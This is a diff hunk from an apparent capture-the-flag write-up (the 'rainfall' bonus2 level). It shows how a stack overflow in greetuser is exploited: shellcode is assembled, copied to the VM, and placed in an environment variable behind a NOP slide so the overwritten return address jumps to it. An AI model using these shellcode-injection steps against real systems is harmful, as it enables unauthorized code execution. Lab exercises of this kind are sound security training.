@@ -32,8 +32,8 @@ export LANG=fi
 When greetuser is called the stack can be setup so its return will pop to our shellcode (placed either on env or argv or the stack), the main problem is to place a reference to our shellcode when leave is called, then ret jumps to it.
 We start by storing the shellcode with a nop slide in the environnement :
 
-nasm ./ressources/shellcode.asm
-[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../bonus1/flag | clipboard ; scp -P 4242 ./ressources/shellcode bonus2@rainfall:/tmp
+nasm ./Resource/shellcode.asm
+[Upload the resulting ./Resource/shellcode to the vm at /tmp] : cat ../bonus1/flag | clipboard ; scp -P 4242 ./Resource/shellcode bonus2@rainfall:/tmp
 export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 1000)'``cat /tmp/shellcode`"
 
 We then figure out the address of the shellcode using gdb :
